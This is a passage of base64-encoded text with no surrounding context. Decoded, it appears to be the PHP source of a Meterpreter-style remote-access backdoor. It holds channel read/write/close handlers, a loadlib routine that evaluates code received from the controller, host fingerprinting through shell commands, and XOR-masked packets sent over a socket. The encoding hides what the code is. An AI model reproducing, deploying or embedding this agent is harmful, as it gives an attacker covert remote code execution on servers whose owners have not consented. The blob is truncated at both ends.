kdUSCk7ICRpZCA9ICRjaGFuX3RsdlsndmFsdWUnXTsgJGxlbiA9ICRsZW5fdGx2Wyd2YWx1ZSddOyAkZGF0YSA9IGNoYW5uZWxfcmVhZCgkaWQsICRsZW4pOyBpZiAoJGRhdGEgPT09IGZhbHNlKSB7ICRyZXMgPSBFUlJPUl9GQUlMVVJFOyB9IGVsc2UgeyBwYWNrZXRfYWRkX3RsdigkcGt0LCBjcmVhdGVfdGx2KFRMVl9UWVBFX0NIQU5ORUxfREFUQSwgJGRhdGEpKTsgJHJlcyA9IEVSUk9SX1NVQ0NFU1M7IH0gcmV0dXJuICRyZXM7IH0gZnVuY3Rpb24gY29yZV9jaGFubmVsX3dyaXRlKCRyZXEsICYkcGt0KSB7ICRjaGFuX3RsdiA9IHBhY2tldF9nZXRfdGx2KCRyZXEsIFRMVl9UWVBFX0NIQU5ORUxfSUQpOyAkZGF0YV90bHYgPSBwYWNrZXRfZ2V0X3RsdigkcmVxLCBUTFZfVFlQRV9DSEFOTkVMX0RBVEEpOyAkbGVuX3RsdiA9IHBhY2tldF9nZXRfdGx2KCRyZXEsIFRMVl9UWVBFX0xFTkdUSCk7ICRpZCA9ICRjaGFuX3RsdlsndmFsdWUnXTsgJGRhdGEgPSAkZGF0YV90bHZbJ3ZhbHVlJ107ICRsZW4gPSAkbGVuX3RsdlsndmFsdWUnXTsgJHdyb3RlID0gY2hhbm5lbF93cml0ZSgkaWQsICRkYXRhLCAkbGVuKTsgaWYgKCR3cm90ZSA9PT0gZmFsc2UpIHsgcmV0dXJuIEVSUk9SX0ZBSUxVUkU7IH0gZWxzZSB7IHBhY2tldF9hZGRfdGx2KCRwa3QsIGNyZWF0ZV90bHYoVExWX1RZUEVfTEVOR1RILCAkd3JvdGUpKTsgcmV0dXJuIEVSUk9SX1NVQ0NFU1M7IH0gfSBmdW5jdGlvbiBjb3JlX2NoYW5uZWxfY2xvc2UoJHJlcSwgJiRwa3QpIHsgZ2xvYmFsICRjaGFubmVsX3Byb2Nlc3NfbWFwOyBteV9wcmludCgiZG9pbmcgY2hhbm5lbCBjbG9zZSIpOyAkY2hhbl90bHYgPSBwYWNrZXRfZ2V0X3RsdigkcmVxLCBUTFZfVFlQRV9DSEFOTkVMX0lEKTsgJGlkID0gJGNoYW5fdGx2Wyd2YWx1ZSddOyAkYyA9IGdldF9jaGFubmVsX2J5X2lkKCRpZCk7IGlmICgkYykgeyBjaGFubmVsX2Nsb3NlX2hhbmRsZXMoJGlkKTsgY2hhbm5lbF9yZW1vdmUoJGlkKTsgaWYgKGFycmF5X2tleV9leGlzdHMoJGlkLCAkY2hhbm5lbF9wcm9jZXNzX21hcCkgYW5kIGlzX2NhbGxhYmxlKCdjbG9zZV9wcm9jZXNzJykpIHsgY2xvc2VfcHJvY2VzcygkY2hhbm5lbF9wcm9jZXNzX21hcFskaWRdKTsgfSByZXR1cm4gRVJST1JfU1VDQ0VTUzsgfSBkdW1wX2NoYW5uZWxzKCJhZnRlciBjbG9zZSIpOyByZXR1cm4gRVJST1JfRkFJTFVSRTsgfSBmdW5jdGlvbiBjaGFubmVsX2Nsb3NlX2hhbmRsZXMoJGNpZCkgeyBnbG9iYWwgJGNoYW5uZWxzOyBpZiAoIWFycmF5X2tleV9leGlzdHMoJGNpZCwgJGNoYW5uZWxzKSkgeyByZXR1cm47IH0gJGMgPSAkY2hhbm5lbHNbJGNpZF07IGZvcigkaSA9IDA7ICRpIDwgMzsgJGkrKykgeyBpZiAoYXJyYXlfa2V5X2V4aXN0cygkaSwgJGMpICYmIGlzX3Jlc291cmNlKCRjWyRpXSkpIHsgY2xvc2UoJGNbJGldKTsgcmVtb3ZlX3JlYWRlcigkY1skaV0pOyB9IH0gaWYgKHN0cmxlbigkY1snZGF0YSddKSA9PSAwKSB7IGNoYW5uZWxfcmVtb3ZlKCRjaWQpOyB9IH0gZnVuY3Rpb24gY2hhbm5lbF9yZW1vdmUoJGNpZCkgeyBnbG9iYWwgJGNoYW5uZWxzOyB1bnNldCgkY2hhbm5lbHNbJGNpZF0pOyB9IGZ1bmN0aW9uIGNvcmVfY2hhbm5lbF9pbnRlcmFjdCgkcmVxLCAmJHBrdCkgeyBnbG9iYWwgJHJlYWRlcnM7IG15X3ByaW50KCJkb2luZyBjaGFubmVsIGludGVyYWN0Iik7ICRjaGFuX3RsdiA9IHBhY2tldF9nZXRfdGx2KCRyZXEsIFRMVl9UWVBFX0NIQU5ORUxfSUQpOyAkaWQgPSAkY2hhbl90bHZbJ3ZhbHVlJ107ICR0b2dnbGVfdGx2ID0gcGFja2V0X2dldF90bHYoJHJlcSwgVExWX1RZUEVfQk9PTCk7ICRjID0gZ2V0X2NoYW5uZWxfYnlfaWQoJGlkKTsgaWYgKCRjKSB7IGlmICgkdG9nZ2xlX3RsdlsndmFsdWUnXSkgeyBpZiAoIWluX2FycmF5KCRjWzFdLCAkcmVhZGVycykpIHsgYWRkX3JlYWRlcigkY1sxXSk7IGlmIChhcnJheV9rZXlfZXhpc3RzKDIsICRjKSAmJiAkY1sxXSAhPSAkY1syXSkgeyBhZGRfcmVhZGVyKCRjWzJdKTsgfSAkcmV0ID0gRVJST1JfU1VDQ0VTUzsgfSBlbHNlIHsgJHJldCA9IEVSUk9SX0ZBSUxVUkU7IH0gfSBlbHNlIHsgaWYgKGluX2FycmF5KCRjWzFdLCAkcmVhZGVycykpIHsgcmVtb3ZlX3JlYWRlcigkY1sxXSk7IHJlbW92ZV9yZWFkZXIoJGNbMl0pOyAkcmV0ID0gRVJST1JfU1VDQ0VTUzsgfSBlbHNlIHsgJHJldCA9IEVSUk9SX1NVQ0NFU1M7IH0gfSB9IGVsc2UgeyBteV9wcmludCgiVHJ5aW5nIHRvIGludGVyYWN0IHdpdGggYW4gaW52YWxpZCBjaGFubmVsIik7ICRyZXQgPSBFUlJPUl9GQUlMVVJFOyB9IHJldHVybiAkcmV0OyB9IGZ1bmN0aW9uIGludGVyYWN0aW5nKCRjaWQpIHsgZ2xvYmFsICRyZWFkZXJzOyAkYyA9IGdldF9jaGFubmVsX2J5X2lkKCRjaWQpOyBpZiAoaW5fYXJyYXkoJGNbMV0sICRyZWFkZXJzKSkgeyByZXR1cm4gdHJ1ZTsgfSByZXR1cm4gZmFsc2U7IH0gZnVuY3Rpb24gY29yZV9zaHV0ZG93bigkcmVxLCAmJHBrdCkgeyBteV9wcmludCgiZG9pbmcgY29yZSBzaHV0ZG93biIpOyBkaWUoKTsgfSBmdW5jdGlvbiBjb3JlX2xvYWRsaWIoJHJlcSwgJiRwa3QpIHsgZ2xvYmFsICRjb21tYW5kczsgbXlfcHJpbnQoImRvaW5nIGNvcmVfbG9hZGxpYiIpOyAkZGF0YV90bHYgPSBwYWNrZXRfZ2V0X3RsdigkcmVxLCBUTFZfVFlQRV9EQVRBKTsgaWYgKCgkZGF0YV90bHZbJ3R5cGUnXSAmIFRMVl9NRVRBX1RZUEVfQ09NUFJFU1NFRCkgPT0gVExWX01FVEFfVFlQRV9DT01QUkVTU0VEKSB7IHJldHVybiBFUlJPUl9GQUlMVVJFOyB9ICR0bXAgPSAkY29tbWFuZHM7IGV2YWwoJGRhdGFfdGx2Wyd2YWx1ZSddKTsgJG5ldyA9IGFycmF5X2RpZmYoJGNvbW1hbmRzLCAkdG1wKTsgZm9yZWFjaCAoJG5ldyBhcyAkbWV0aCkgeyBwYWNrZXRfYWRkX3RsdigkcGt0LCBjcmVhdGVfdGx2KFRMVl9UWVBFX01FVEhPRCwgJG1ldGgpKTsgfSByZXR1cm4gRVJST1JfU1VDQ0VTUzsgfSBmdW5jdGlvbiBjb3JlX2VudW1leHRjbWQoJHJlcSwgJiRwa3QpIHsgbXlfcHJpbnQoImRvaW5nIGNvcmVfZW51bWV4dGNtZCIpOyBnbG9iYWwgJGNvbW1hbmRzOyAkZXh0ZW5zaW9uX25hbWVfdGx2ID0gcGFja2V0X2dldF90bHYoJHJlcSwgVExWX1RZUEVfU1RSSU5HKTs7ICRleHBlY3RlZF9leHRfbmFtZSA9ICRleHRlbnNpb25fbmFtZV90bHZbJ3ZhbHVlJ107IGZvcmVhY2ggKCRjb21tYW5kcyBhcyAkZXh0X2NtZCkgeyBsaXN0KCRleHRfbmFtZSwgJGNtZCkgPSBleHBsb2RlKCJfIiwgJGV4dF9jbWQsIDIpOyBpZiAoJGV4dF9uYW1lID09ICRleHBlY3RlZF9leHRfbmFtZSkgeyBwYWNrZXRfYWRkX3RsdigkcGt0LCBjcmVhdGVfdGx2KFRMVl9UWVBFX1NUUklORywgJGNtZCkpOyB9IH0gcmV0dXJuIEVSUk9SX1NVQ0NFU1M7IH0gZnVuY3Rpb24gY29yZV9zZXRfdXVpZCgkcmVxLCAmJHBrdCkgeyBteV9wcmludCgiZG9pbmcgY29yZV9zZXRfdXVpZCIpOyAkbmV3X3V1aWQgPSBwYWNrZXRfZ2V0X3RsdigkcmVxLCBUTFZfVFlQRV9VVUlEKTsgaWYgKCRuZXdfdXVpZCAhPSBudWxsKSB7ICRHTE9CQUxTWydVVUlEJ10gPSAkbmV3X3V1aWRbJ3ZhbHVlJ107IG15X3ByaW50KCJOZXcgVVVJRCBpcyB7JEdMT0JBTFNbJ1VVSUQnXX0iKTsgfSByZXR1cm4gRVJST1JfU1VDQ0VTUzsgfSBmdW5jdGlvbiBnZXRfaGRkX2xhYmVsKCkgeyBmb3JlYWNoIChzY2FuZGlyKCcvZGV2L2Rpc2svYnktaWQvJykgYXMgJGZpbGUpIHsgZm9yZWFjaCAoYXJyYXkoImF0YS0iLCAibWItIikgYXMgJHByZWZpeCkgeyBpZiAoc3RycG9zKCRmaWxlLCAkcHJlZml4KSA9PT0gMCkgeyByZXR1cm4gc3Vic3RyKCRmaWxlLCBzdHJsZW4oJHByZWZpeCkpOyB9IH0gfSByZXR1cm4gIiI7IH0gZnVuY3Rpb24gY29yZV9tYWNoaW5lX2lkKCRyZXEsICYkcGt0KSB7IG15X3ByaW50KCJkb2luZyBjb3JlX21hY2hpbmVfaWQiKTsgaWYgKGlzX2NhbGxhYmxlKCdnZXRob3N0bmFtZScpKSB7ICRtYWNoaW5lX2lkID0gZ2V0aG9zdG5hbWUoKTsgfSBlbHNlIHsgJG1hY2hpbmVfaWQgPSBwaHBfdW5hbWUoJ24nKTsgfSAkc2VyaWFsID0gIiI7IGlmIChpc193aW5kb3dzKCkpIHsgJG91dHB1dCA9IHN0cnRvbG93ZXIoc2hlbGxfZXhlYygidm9sICVTWVNURU1EUklWRSUiKSk7ICRzZXJpYWwgPSBwcmVnX3JlcGxhY2UoJy8uKnNlcmlhbCBudW1iZXIgaXMgKFthLXowLTldezR9LVthLXowLTldezR9KS4qL3MnLCAnJDEnLCAkb3V0cHV0KTsgfSBlbHNlIHsgJHNlcmlhbCA9IGdldF9oZGRfbGFiZWwoKTsgfSBwYWNrZXRfYWRkX3RsdigkcGt0LCBjcmVhdGVfdGx2KFRMVl9UWVBFX01BQ0hJTkVfSUQsICRzZXJpYWwuIjoiLiRtYWNoaW5lX2lkKSk7IHJldHVybiBFUlJPUl9TVUNDRVNTOyB9ICRjaGFubmVscyA9IGFycmF5KCk7IGZ1bmN0aW9uIHJlZ2lzdGVyX2NoYW5uZWwoJGluLCAkb3V0PW51bGwsICRlcnI9bnVsbCkgeyBnbG9iYWwgJGNoYW5uZWxzOyBpZiAoJG91dCA9PSBudWxsKSB7ICRvdXQgPSAkaW47IH0gaWYgKCRlcnIgPT0gbnVsbCkgeyAkZXJyID0gJG91dDsgfSAkY2hhbm5lbHNbXSA9IGFycmF5KDAgPT4gJGluLCAxID0+ICRvdXQsIDIgPT4gJGVyciwgJ3R5cGUnID0+IGdldF9ydHlwZSgkaW4pLCAnZGF0YScgPT4gJycpOyAkaWQgPSBlbmQoYXJyYXlfa2V5cygkY2hhbm5lbHMpKTsgbXlfcHJpbnQoIkNyZWF0ZWQgbmV3IGNoYW5uZWwgJGluLCB3aXRoIGlkICRpZCIpOyByZXR1cm4gJGlkOyB9IGZ1bmN0aW9uIGdldF9jaGFubmVsX2lkX2Zyb21fcmVzb3VyY2UoJHJlc291cmNlKSB7IGdsb2JhbCAkY2hhbm5lbHM7IGlmIChlbXB0eSgkY2hhbm5lbHMpKSB7IHJldHVybiBmYWxzZTsgfSBmb3JlYWNoICgkY2hhbm5lbHMgYXMgJGkgPT4gJGNoYW5fYXJ5KSB7IGlmIChpbl9hcnJheSgkcmVzb3VyY2UsICRjaGFuX2FyeSkpIHsgbXlfcHJpbnQoIkZvdW5kIGNoYW5uZWwgaWQgJGkiKTsgcmV0dXJuICRpOyB9IH0gcmV0dXJuIGZhbHNlOyB9IGZ1bmN0aW9uICZnZXRfY2hhbm5lbF9ieV9pZCgkY2hhbl9pZCkgeyBnbG9iYWwgJGNoYW5uZWxzOyBteV9wcmludCgiTG9va2luZyB1cCBjaGFubmVsIGlkICRjaGFuX2lkIik7IGlmIChhcnJheV9rZXlfZXhpc3RzKCRjaGFuX2lkLCAkY2hhbm5lbHMpKSB7IG15X3ByaW50KCJGb3VuZCBvbmUiKTsgcmV0dXJuICRjaGFubmVsc1skY2hhbl9pZF07IH0gZWxzZSB7IHJldHVybiBmYWxzZTsgfSB9IGZ1bmN0aW9uIGNoYW5uZWxfd3JpdGUoJGNoYW5faWQsICRkYXRhKSB7ICRjID0gZ2V0X2NoYW5uZWxfYnlfaWQoJGNoYW5faWQpOyBpZiAoJGMgJiYgaXNfcmVzb3VyY2UoJGNbMF0pKSB7IG15X3ByaW50KCItLS1Xcml0aW5nICckZGF0YScgdG8gY2hhbm5lbCAkY2hhbl9pZCIpOyByZXR1cm4gd3JpdGUoJGNbMF0sICRkYXRhKTsgfSBlbHNlIHsgcmV0dXJuIGZhbHNlOyB9IH0gZnVuY3Rpb24gY2hhbm5lbF9yZWFkKCRjaGFuX2lkLCAkbGVuKSB7ICRjID0gJmdldF9jaGFubmVsX2J5X2lkKCRjaGFuX2lkKTsgaWYgKCRjKSB7ICRyZXQgPSBzdWJzdHIoJGNbJ2RhdGEnXSwgMCwgJGxlbik7ICRjWydkYXRhJ10gPSBzdWJzdHIoJGNbJ2RhdGEnXSwgJGxlbik7IGlmIChzdHJsZW4oJHJldCkgPiAwKSB7IG15X3ByaW50KCJIYWQgc29tZSBsZWZ0b3ZlcnM6ICckcmV0JyIpOyB9IGlmIChzdHJsZW4oJHJldCkgPCAkbGVuIGFuZCBpc19yZXNvdXJjZSgkY1syXSkgYW5kICRjWzFdICE9ICRjWzJdKSB7ICRyZWFkID0gcmVhZCgkY1syXSk7ICRjWydkYXRhJ10gLj0gJHJlYWQ7ICRieXRlc19uZWVkZWQgPSAkbGVuIC0gc3RybGVuKCRyZXQpOyAkcmV0IC49IHN1YnN0cigkY1snZGF0YSddLCAwLCAkYnl0ZXNfbmVlZGVkKTsgJGNbJ2RhdGEnXSA9IHN1YnN0cigkY1snZGF0YSddLCAkYnl0ZXNfbmVlZGVkKTsgfSBpZiAoc3RybGVuKCRyZXQpIDwgJGxlbiBhbmQgaXNfcmVzb3VyY2UoJGNbMV0pKSB7ICRyZWFkID0gcmVhZCgkY1sxXSk7ICRjWydkYXRhJ10gLj0gJHJlYWQ7ICRieXRlc19uZWVkZWQgPSAkbGVuIC0gc3RybGVuKCRyZXQpOyAkcmV0IC49IHN1YnN0cigkY1snZGF0YSddLCAwLCAkYnl0ZXNfbmVlZGVkKTsgJGNbJ2RhdGEnXSA9IHN1YnN0cigkY1snZGF0YSddLCAkYnl0ZXNfbmVlZGVkKTsgfSBpZiAoZmFsc2UgPT09ICRyZWFkIGFuZCBlbXB0eSgkcmV0KSkgeyBpZiAoaW50ZXJhY3RpbmcoJGNoYW5faWQpKSB7IGhhbmRsZV9kZWFkX3Jlc291cmNlX2NoYW5uZWwoJGNbMV0pOyB9IHJldHVybiBmYWxzZTsgfSByZXR1cm4gJHJldDsgfSBlbHNlIHsgcmV0dXJuIGZhbHNlOyB9IH0gZnVuY3Rpb24gcmFuZF94b3JfYnl0ZSgpIHsgcmV0dXJuIGNocihtdF9yYW5kKDEsIDI1NSkpOyB9IGZ1bmN0aW9uIHJhbmRfeG9yX2tleSgpIHsgcmV0dXJuIHJhbmRfeG9yX2J5dGUoKSAuIHJhbmRfeG9yX2J5dGUoKSAuIHJhbmRfeG9yX2J5dGUoKSAuIHJhbmRfeG9yX2J5dGUoKTsgfSBmdW5jdGlvbiB4b3JfYnl0ZXMoJGtleSwgJGRhdGEpIHsgJHJlc3VsdCA9ICcnOyBmb3IgKCRpID0gMDsgJGkgPCBzdHJsZW4oJGRhdGEpOyArKyRpKSB7ICRyZXN1bHQgLj0gJGRhdGF7JGl9IF4gJGtleXskaSAlIDR9OyB9IHJldHVybiAkcmVzdWx0OyB9IGZ1bmN0aW9uIGdlbmVyYXRlX3JlcV9pZCgpIHsgJGNoYXJhY3RlcnMgPSAnYWJjZGVmZ2hpamtsbW5vcHFyc3R1dnd4eXonOyAkcmlkID0gJyc7IGZvciAoJHAgPSAwOyAkcCA8IDMyOyAkcCsrKSB7ICRyaWQgLj0gJGNoYXJhY3RlcnNbcmFuZCgwLCBzdHJsZW4oJGNoYXJhY3RlcnMpLTEpXTsgfSByZXR1cm4gJHJpZDsgfSBmdW5jdGlvbiB3cml0ZV90bHZfdG9fc29ja2V0KCRyZXNvdXJjZSwgJHJhdykgeyAkeG9yID0gcmFuZF94b3Jfa2V5KCk7IHdyaXRlKCRyZXNvdXJjZSwgc3RycmV2KCR4b3IpIC4geG9yX2J5dGVzKCR4b3IsICRyYXcpKTsgfSBmdW5jdGlvbiBoYW5kbGVfZGVhZF9yZXNvdXJjZV9jaGFubmVsKCRyZXNvdXJjZSkgeyBnbG9iYWwgJG1zZ3NvY2s7IGlmICghaXNfcmVzb3VyY2UoJHJlc291cmNlKSkgeyByZXR1cm47IH0gJGNpZCA9IGdldF9jaGFubmVsX2lkX2Zyb21fcmVzb3VyY2UoJHJlc291cmNlKTsgaWYgKCRjaWQgPT09IGZhbHNlKSB7IG15X3ByaW50KCJSZXNvdXJjZSBoYXMgbm8gY2hhbm5lbDogeyRyZXNvdXJjZX0iKTsgcmVtb3ZlX3JlYWRlcigkcmVzb3VyY2UpOyBjbG9zZSgkcmVzb3VyY2UpOyB9IGVsc2UgeyBteV9wcmludCgiSGFuZGxpbmcgZGVhZCByZXNvdXJjZTogeyRyZXNvdXJjZX0sIGZvciBjaGFubmVsOiB7JGNpZH0iKTsgY2hhbm5lbF9jbG9zZV9oYW5kbGVzKCRjaWQpOyAkcGt0ID0gcGFjaygiTiIsIFBBQ0tFVF9UWVBFX1JFUVVFU1QpOyBwYWNrZXRfYWRkX3RsdigkcGt0LCBjcmVhdGVfdGx2KFRMVl9UWVBFX01FVEhPRCwgJ2NvcmVfY2hhbm5lbF9jbG9zZScpKTsgcGFja2V0X2FkZF90bHYoJHBrdCwgY3JlYXRlX3RsdihUTFZfVFlQRV9SRVFVRVNUX0lELCBnZW5lcmF0ZV9yZXFfaWQoKSkpOyBwYWNrZXRfYWRkX3RsdigkcGt0LCBjcmVhdGVfdGx2KFRMVl9UWVBFX0NIQU5ORUxfSUQsICRjaWQpKTsgcGFja2V0X2FkZF90bHYoJHBrdCwgY3JlYXRlX3RsdihUTFZfVFlQRV9VVUlELCAkR0xPQkFMU1snVVVJRCddKSk7ICRwa3QgPSBwYWNrKCJOIiwgc3RybGVuKCRwa3QpICsgNCkgLiAkcGt0OyB3cml0ZV90bHZfdG9fc29ja2V0KCRtc2dzb2NrLCAkcGt0KTsgfSB9IGZ1bmN0aW9uIGhhbmRsZV9yZXNvdXJjZV9yZWFkX2NoYW5uZWwoJHJlc291cmNlLCAkZGF0YSkgeyBnbG9iYWwgJHVkcF9ob3N0X21hcDsgJGNpZCA9IGdldF9jaGFubmVsX2lkX2Zyb21fcmVzb3VyY2UoJHJlc291cmNlKTsgbXlfcHJpbnQoIkhhbmRsaW5nIGRhdGEgZnJvbSAkcmVzb3VyY2UiKTsgJHBrdCA9IHBhY2soIk4iLCBQQUNLRVRfVFlQRV9SRVFVRVNUKTsgcGFja2V0X2FkZF90bHYoJHBrdCwgY3JlYXRlX3RsdihUTFZfVFlQRV9NRVRIT0QsICdjb3JlX2NoYW5uZWxfd3JpdGUnKSk7IGlmIChhcnJheV9rZXlfZXhpc3RzKChpbnQpJHJlc291cmNlLCAkdWRwX2hvc3RfbWFwKSkgeyBsaXN0KCRoLCRwKSA9ICR1ZHBfaG9zdF9tYXBbKGludCkkcmVzb3VyY2VdOyBwYWNrZXRfYWRkX3RsdigkcGt0LCBjcmVhdGVfdGx2KFRMVl9UWVBFX1BFRVJfSE9TVCwgJGgpKTsgcGFja2V0X2FkZF90bHYoJHBrdCwgY3JlYXRlX3RsdihUTFZfVFlQRV9QRUVSX1BPUlQsICRwKSk7IH0gcGFja2V0X2FkZF90bHYoJHBrdCwgY3JlYXRlX3RsdihUTFZfVFlQRV9DSEFOTkVMX0lELCAkY2lkKSk7IHBhY2tldF9hZGRfdGx2KCRwa3QsIGNyZWF0ZV90bHYoVExWX1RZUEVfQ0hBTk5FTF9EQVRBLCAkZGF0YSkpOyBwYWNrZXRfYWRkX3RsdigkcGt0LCBjcmVhdGVfdGx2KFRMVl9UWVBFX0xFTkdUSCwgc3RybGVuKCRkYXRhKSkpOyBwYWNrZXRfYWRkX3RsdigkcGt0LCBjcmVhdGVfdGx2KFRMVl9UWVBFX1JFUVVFU1RfSUQsIGdlbmVyYXRlX3JlcV9pZCgpKSk7IHBhY2tldF9hZGRfdGx2KCRwa3QsIGNyZWF0ZV90bHYoVExWX1RZUEVfVVVJRCwgJEdMT0JBTFNbJ1VVSUQnXSkpOyAkcGt0ID0gcGFjaygiTiIsIHN0cmxlbigkcGt0KSArIDQpIC4gJHBrdDsgcmV0dXJuICRwa3Q7IH0gZnVuY3Rpb24gY3JlYXRlX3Jlc3BvbnNlKCR4b3IsICRyZXEpIHsgJHJlcSA9IHhvcl9ieXRlcygkeG9yLCAkcmVxKTsgJHBrdCA9IHBhY2soIk4iLCBQQUNLRVRfVFlQRV9SRVNQT05TRSk7ICRtZXRob2RfdGx2ID0gcGFja2V0X2dldF90bHYoJHJlcSwgVExWX1RZUEVfTUVUSE9EKTsgbXlfcHJpbnQoIm1ldGhvZCBpcyB7JG1ldGhvZF90bHZbJ3ZhbHVlJ119Iik7IHBhY2tldF9hZGRfdGx2KCRwa3QsICRtZXRob2RfdGx2KTsgJHJlcWlkX3RsdiA9IHBhY2tldF9nZXRfdGx2KCRyZXEsIFRMVl9UWVBFX1JFUVVFU1RfSUQpOyBwYWNrZXRfYWRkX3RsdigkcGt0LCAkcmVxaWRfdGx2KTsgaWYgKGlzX2NhbGxhYmxlKCRtZXRob2RfdGx2Wyd2YWx1ZSddKSkgeyAkcmVzdWx0ID0gJG1ldGhvZF90bHZbJ3ZhbHVlJ10oJHJlcSwgJHBrdCk7IH0gZWxzZSB7IG15X3ByaW50KCJHb3QgYSByZXF1ZXN0IGZvciBzb21ldGhpbmcgSSBkb24ndCBrbm93IGhvdyB0byBoYW5kbGUgKCIuICRtZXRob2RfdGx2Wyd2YWx1ZSddIC4iKSwgcmV0dXJuaW5nIGZhaWx1cmUiKTsgJHJlc3VsdCA9IEVSUk9SX0ZBSUxVUkU7IH0gcGFja2V0X2FkZF90bHYoJHBrdCwgY3JlYXRlX3RsdihUTFZfVFlQRV9SRVNVTFQsICRyZXN1bHQpKTsgcGFja2V0X2FkZF90bHYoJHBrdCwgY3JlYXRlX3RsdihUTFZfVFlQRV9VVUlELCAkR0xPQkFMU1snVVVJRCddKSk7ICRwa3QgPSBwYWNrKCJOIiwgc3RybGVuKCRwa3QpICsgNCkgLiAkcGt0OyByZXR1cm4gJHBrdDsgfSBmdW5jdGlvbiBjcmVhdGVfdGx2KCR0eXBlLCAkdmFsKSB7IHJldHVybiBhcnJheSggJ3R5cGUnID0+ICR0eXBlLCAndmFsdWUnID0+ICR2YWwgKTsgfSBmdW5jdGlvbiB0bHZfcGFjaygkdGx2KSB7ICRyZXQgPSAiIjsgaWYgKCgkdGx2Wyd0eXBlJ10gJiBUTFZfTUVUQV9UWVBFX1NUUklORykgPT0gVExWX01FVEFfVFlQRV9TVFJJTkcpIHsgJHJldCA9IHBhY2soIk5OYSoiLCA4ICsgc3RybGVuKCR0bHZbJ3ZhbHVlJ10pKzEsICR0bHZbJ3R5cGUnXSwgJHRsdlsndmFsdWUnXSAuICJcMCIpOyB9IGVsc2VpZiAoKCR0bHZbJ3R5cGUnXSAmIFRMVl9NRVRBX1RZUEVfUVdPUkQpID09IFRMVl9NRVRBX1RZUEVfUVdPUkQpIHsgJGhpID0gKCR0bHZbJ3ZhbHVlJ10gPj4gMzIpICYgMHhGRkZGRkZGRjsgJGxvID0gJHRsdlsndmFsdWUnXSAmIDB4RkZGRkZGRkY7ICRyZXQgPSBwYWNrKCJOTk5OIiwgOCArIDgsICR0bHZbJ3R5cGUnXSwgJGhpLCAkbG8pOyB9IGVsc2VpZiAoKCR0bHZbJ3R5cGUnXSAmIFRMVl9NRVRBX1RZUEVfVUlOVCkgPT0gVExWX01FVEFfVFlQRV9VSU5UKSB7ICRyZXQgPSBwYWNrKCJOTk4iLCA4ICsgNCwgJHRsdlsndHlwZSddLCAkdGx2Wyd2YWx1ZSddKTsgfSBlbHNlaWYgKCgkdGx2Wyd0eXBlJ10gJiBUTFZfTUVUQV9UWVBFX0JPT0wpID09IFRMVl9NRVRBX1RZUEVfQk9PTCkgeyAkcmV0ID0gcGFjaygiTk4iLCA4ICsgMSwgJHRsdlsndHlwZSddKTsgJHJldCAuPSAkdGx2Wyd2YWx1ZSddID8gIlx4MDEiIDogIlx4MDAiOyB9IGVsc2VpZiAoKCR0bHZbJ3R5cGUnXSAmIFRMVl9NRVRBX1RZUEVfUkFXKSA9PSBUTFZfTUVUQV9UWVBFX1JBVykgeyAkcmV0ID0gcGFjaygiTk4iLCA4ICsgc3RybGVuKCR0bHZbJ3ZhbHVlJ10pLCAkdGx2Wyd0eXBlJ10pIC4gJHRsdlsndmFsdWUnXTsgfSBlbHNlaWYgKCgkdGx2Wyd0eXBlJ10gJiBUTFZfTUVUQV9UWVBFX0dST1VQKSA9PSBUTFZfTUVUQV9UWVBFX0dST1VQKSB7ICRyZXQgPSBwYWNrKCJOTiIsIDggKyBzdHJsZW4oJHRsdlsndmFsdWUnXSksICR0bHZbJ3R5cGUnXSkgLiAkdGx2Wyd2YWx1ZSddOyB9IGVsc2VpZiAoKCR0bHZbJ3R5cGUnXSAmIFRMVl9NRVRBX1RZUEVfQ09NUExFWCkgPT0gVExWX01FVEFfVFlQRV9DT01QTEVYKSB7ICRyZXQgPSBwYWNrKCJOTiIsIDggKyBzdHJsZW4oJHRsdlsndmFsdWUnXSksICR0bHZbJ3R5cGUnXSkgLiAkdGx2Wyd2YWx1ZSddOyB9IGVsc2UgeyBteV9wcmludCgiRG9uJ3Qga25vdyBob3cgdG8gbWFrZSBhIHRsdiBvZiB0eXBlICIuICR0bHZbJ3R5cGUnXSAuICIgKG1ldGEgdHlwZSAiLiBzcHJpbnRmKCIlMDh4IiwgJHRsdlsndHlwZSddICYgVExWX01FVEFfVFlQRV9NQVNLKSAuIiksIHd0ZiIpOyB9IHJldHVybiAkcmV0OyB9IGZ1bmN0aW9uIHRsdl91bnBhY2soJHJhd190bHYpIHsgJHRsdiA9IHVucGFjaygiTmxlbi9OdHlwZSIsIHN1YnN0cigkcmF3X3RsdiwgMCwgOCkpOyAkdHlwZSA9ICR0bHZbJ3R5cGUnXTsgbXlfcHJpbnQoImxlbjogeyR0bHZbJ2xlbiddfSwgdHlwZTogeyR0bHZbJ3R5cGUnXX0iKTsgaWYgKCgkdHlwZSAmIFRMVl9NRVRBX1RZUEVfU1RSSU5HKSA9PSBUTFZfTUVUQV9UWVBFX1NUUklORykgeyAkdGx2ID0gdW5wYWNrKCJObGVuL050eXBlL2EqdmFsdWUiLCBzdWJzdHIoJHJhd190bHYsIDAsICR0bHZbJ2xlbiddKSk7ICR0bHZbJ3ZhbHVlJ10gPSBzdHJfcmVwbGFjZSgiXDAiLCAiIiwgJHRsdlsndmFsdWUnXSk7IH0gZWxzZWlmICgoJHR5cGUgJiBUTFZfTUVUQV9UWVBFX1VJTlQpID09IFRMVl9NRVRBX1RZUEVfVUlOVCkgeyAkdGx2ID0gdW5wYWNrKCJObGVuL050eXBlL052YWx1ZSIsIHN1YnN0cigkcmF3X3RsdiwgMCwgJHRsdlsnbGVuJ10pKTsgfSBlbHNlaWYgKCgkdHlwZSAmIFRMVl9NRVRBX1RZUEVfUVdPUkQpID09IFRMVl9NRVRBX1RZUEVfUVdPUkQpIHsgJHRsdiA9IHVucGFjaygiTmxlbi9OdHlwZS9OaGkvTmxvIiwgc3Vic3RyKCRyYXdfdGx2LCAwLCAkdGx2WydsZW4nXSkpOyAkdGx2Wyd2YWx1ZSddID0gJHRsdlsnaGknXSA8PCAzMiB8ICR0bHZbJ2xvJ107IH0gZWxzZWlmICgoJHR5cGUgJiBUTFZfTUVUQV9UWVBFX0JPT0wpID09IFRMVl9NRVRBX1RZUEVfQk9PTCkgeyAkdGx2ID0gdW5wYWNrKCJObGVuL050eXBlL2N2YWx1ZSIsIHN1YnN0cigkcmF3X3RsdiwgMCwgJHRsdlsnbGVuJ10pKTsgfSBlbHNlaWYgKCgkdHlwZSAmIFRMVl9NRVRBX1RZUEVfUkFXKSA9PSBUTFZfTUVUQV9UWVBFX1JBVykgeyAkdGx2ID0gdW5wYWNrKCJObGVuL050eXBlIiwgJHJhd190bHYpOyAkdGx2Wyd2YWx1ZSddID0gc3Vic3RyKCRyYXdfdGx2LCA4LCAkdGx2WydsZW4nX